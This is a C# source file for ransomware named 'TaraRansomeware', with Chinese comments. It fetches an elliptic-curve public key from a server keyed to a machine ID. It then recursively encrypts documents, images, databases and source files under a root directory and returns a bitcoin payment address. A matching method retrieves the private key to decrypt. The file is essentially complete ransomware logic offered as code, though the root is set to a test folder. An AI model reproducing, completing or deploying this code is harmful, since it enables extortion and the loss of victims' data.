using Org.BouncyCastle.Crypto.Digests;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Utilities.Encoders;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;


namespace TaraRansomeware
{
    internal class Ransomeware
    {
        /// <summary>
        /// 获取机器的唯一识别码
        /// </summary>
        private static readonly byte[] guid = GuidGenerator.getHash(new Sha256Digest());

        /// <summary>
        /// 需要进行感染的目录根
        /// </summary>
        private string[] rootdir = { "E:/test" };

        /// <summary>
        /// 文件处理器
        /// </summary>
        private FileProcessor processor = new FileProcessor(guid);

        /// <summary>
        /// 触发勒索
        /// </summary>
        /// <returns>付款的比特币地址</returns>
        public string Blackmail()
        {
            Task<string> t = Task.Run(() => HttpUtils.httpreq(guid, HttpUtils.PostAction.Blackmail));
            ECPublicKeyParameters cipPubKey = KeyUtils.DecodeECPublicKey(Hex.Decode(t.Result));

            foreach (string dir in rootdir)
            {
                EncryptDirectory(cipPubKey, dir);
            }

            return Task.Run(() => HttpUtils.httpreq(guid, HttpUtils.PostAction.Redemption)).Result;
        }

        /// <summary>
        /// 触发赎回
        /// </summary>
        public void Redemption()
        {
            Task<string> t = Task.Run(() => HttpUtils.httpreq(guid, HttpUtils.PostAction.Redemption));
            ECPrivateKeyParameters cipPrivKey = KeyUtils.DecodeECPrivateKey(Hex.Decode(t.Result));

            foreach(string dir in rootdir)
            {
                DecryptDirectory(cipPrivKey, dir);
            }
        }

        /// <summary>
        /// 文件夹加密
        /// </summary>
        /// <param name="cipPubKey">加密公钥</param>
        /// <param name="location">文件夹位置</param>
        public void EncryptDirectory(ECPublicKeyParameters cipPubKey, string location)
        {
            var validExtensions = new[]
            {
                ".txt", ".md", ".tex", ".rst",
                ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
                ".jpg", ".png", ".psd",
                ".csv", ".sql", ".mdb", ".sln",
                ".php", ".asp", ".aspx", ".html", ".xml", ".py", ".js"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);

            foreach (string filePath in files)
            {
                string extension = Path.GetExtension(filePath);
                if (validExtensions.Contains(extension))
                {
                    Debug.WriteLine(Path.GetFullPath(filePath));
                    processor.EncryptFile(cipPubKey, Path.GetFullPath(filePath));
                }
            }

            foreach (string subDir in childDirectories)
            {
                EncryptDirectory(cipPubKey, Path.GetFullPath(subDir));
            }
        }

        /// <summary>
        /// 文件夹解密
        /// </summary>
        /// <param name="cipPrivKey">解密私钥</param>
        /// <param name="location">文件夹位置</param>
        public void DecryptDirectory(ECPrivateKeyParameters cipPrivKey, string location)
        {
            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            string validExtension = FileProcessor.lockSuffix;

            foreach (string filePath in files)
            {
                string extension = Path.GetExtension(filePath);
                if (extension == validExtension)
                {
                    Debug.WriteLine(Path.GetFullPath(filePath));
                    processor.RestoreFile(cipPrivKey, Path.GetFullPath(filePath));
                }
            }

            foreach (string subDir in childDirectories)
            {
                DecryptDirectory(cipPrivKey, Path.GetFullPath(subDir));
            }
        }
    }
}
